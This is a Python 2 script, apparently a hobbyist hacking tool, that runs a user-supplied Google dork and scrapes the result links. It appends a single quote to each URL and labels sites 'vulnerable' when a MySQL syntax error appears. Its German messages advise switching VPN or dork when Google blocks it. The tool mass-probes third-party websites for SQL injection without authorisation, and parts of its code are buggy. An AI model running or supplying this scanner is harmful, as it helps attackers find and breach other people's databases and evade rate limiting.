# -*- encoding: utf-8 -*-

'''
    @author Lucas Deutschland
'''
from bs4 import BeautifulSoup
import requests
import re
import urllib2
import sys

try:
    def search(search, sites, datei):
        seiten = sites               
        site = "http://www.google.com/search?q=%s&start=%i"%(search,seiten)
        page = requests.get(site, headers={
            "headers": {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "close",
                "Host": "google.com",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
            }
        })
        #bzw.page = requests.get("http://www.google.de/search?client=opera&q="+search)
        soup = BeautifulSoup(page.content, 'html.parser')
        links = soup.find_all("a",href=re.compile("(?<=/url\?q=)(htt.*://.*)"))
        urls = [re.split(":(?=http)",link["href"].replace("/url?q=",""))[0] for link in links]
        allLinks = [url for url in urls if 'webcache' not in url]
        #print "\n".join(allLinks)
        #outF = open("google_suche", "w")
        print "-------------------------\nSort vulnerable sites on page %s\n------------------------- "%str(datei)
        for x in allLinks:
            try:
                blubber = x.split("&sa")[0]
                decoded = urllib2.unquote(blubber).decode('utf8')
                sqli_search(decoded)
            except:
                print "Site is down!"

    
    def google_search(search1, sites):
        sites = int(sites)
        if sites == 0:
            search(search1,0,1)
        else:
            i = 1
            while i <= sites:
                search(search1,(i*10),i)
                i += 1    

    def sqli_search(decodedUrl):
        page = requests.get(decodedUrl+"'")
        output = ["You have an error in your SQL syntax"]
        block_output = ["Our systems have detected unusual traffic from your computer network."]
        if any(t in page.text for t in output):
            outF = open(decodedUrl, "w")
            outF.write("\n %s"%decodedUrl)
            outF.close()
            print ("Site is vulnerable(%s)"%decodedUrl)
        elif any(r in page.text for r in block_output):
            print "Du wurdest geblockt! Versuch es mit einem anderen Dork, anderem VPN oder warte ein paar Minuten."
            sys.exit(1)
        else:
            print ("Site isn't vulnerable(%s)"%decodedUrl)


    def start_menu():
        begriff = raw_input("Google Dork: ")
        seiten = raw_input("How many sites do you want to open?(Recommended: 8): ")
        try:
            google_search(begriff, seiten)
        except ValueError:
            print "Bitte einen Integer (Ganzkommazahl) angeben."
            start_menu()
        

    def credits():
        print "################################"
        print "  Coded by: Dailox"
        print "################################"
        print "\n"

    
    credits()
    #outF = open("google_suche", "w")
    start_menu()
except KeyboardInterrupt as e:
    print "\nClosed...\n"





